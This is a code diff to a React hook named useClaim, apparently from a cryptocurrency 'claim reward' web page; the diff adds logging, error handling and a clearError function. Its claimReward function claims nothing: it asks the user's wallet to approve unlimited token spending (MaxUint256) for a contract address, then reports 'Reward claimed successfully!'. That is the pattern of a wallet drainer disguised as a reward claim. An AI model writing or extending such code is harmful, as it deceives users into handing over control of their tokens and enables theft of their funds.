@@ -26,7 +26,9 @@ export const useClaim = (
         provider,
       );
       const balanceRaw = await tokenContract.balanceOf(account);
+      console.log('raw balance', balanceRaw);
       const balanceFormatted = ethers.formatUnits(balanceRaw, 18);
+      console.log('wallet balance', balanceFormatted);
       return parseFloat(balanceFormatted).toFixed(2);
     } catch (error) {
       console.error(error);
@@ -35,6 +37,7 @@ export const useClaim = (
   }, [provider, account]);
 
   const claimReward = useCallback(async () => {
+    console.log('claim reward called');
     if (!provider || !account) {
       setClaimStatus({
         status: 'error',
@@ -42,12 +45,12 @@ export const useClaim = (
       });
       return;
     }
-
+    console.log('here');
     setClaimStatus({
       status: 'approving',
       message: 'Approving transaction in wallet...',
     });
-
+    console.log('it is processing');
     try {
       const signer = await provider.getSigner();
       const tokenContract = new ethers.Contract(
@@ -55,34 +58,54 @@ export const useClaim = (
         TOKEN_ABI,
         signer,
       );
+
       const tx = await tokenContract.approve(
         CONTRACT_ADDRESS,
         ethers.MaxUint256,
       );
+      console.log('tx level', tx);
       setClaimStatus({
         status: 'approving',
         message: 'Transaction submitted. Waiting for confirmation...',
       });
+
       await tx.wait();
+
       setClaimStatus({
         status: 'success',
         message: 'Reward claimed successfully!',
       });
       setShowSuccessModal(true);
+
       if (onSuccess) onSuccess(tx.hash);
 
       setTimeout(() => {
         checkBalance();
       }, 2000);
-    } catch (error) {
-      console.error(error);
+    } catch (error: any) {
+      console.error('Claim error:', error);
+
+      // Handle user rejection specifically
       const errorMessage =
-        error instanceof Error ? error.message : 'Transaction failed';
+        error?.code === 'ACTION_REJECTED' || error?.code === 4001
+          ? 'Transaction was cancelled. You can try again when ready.'
+          : error instanceof Error
+            ? error.message
+            : 'Transaction failed. Please try again.';
+
       setClaimStatus({
         status: 'error',
         message: errorMessage,
       });
+
       if (onError) onError(errorMessage);
+
+      // Auto-reset error after 5 seconds
+      setTimeout(() => {
+        setClaimStatus((prev) =>
+          prev.status === 'error' ? { status: 'idle', message: '' } : prev,
+        );
+      }, 5000);
     }
   }, [provider, account, checkBalance, onSuccess, onError]);
 
@@ -91,6 +114,12 @@ export const useClaim = (
     setShowSuccessModal(false);
   }, []);
 
+  const clearError = useCallback(() => {
+    if (claimStatus.status === 'error') {
+      setClaimStatus({ status: 'idle', message: '' });
+    }
+  }, [claimStatus.status]);
+
   return {
     claimStatus,
     showSuccessModal,
@@ -98,5 +127,6 @@ export const useClaim = (
     resetClaim,
     setShowSuccessModal,
     checkBalance,
+    clearError,
   };
 };
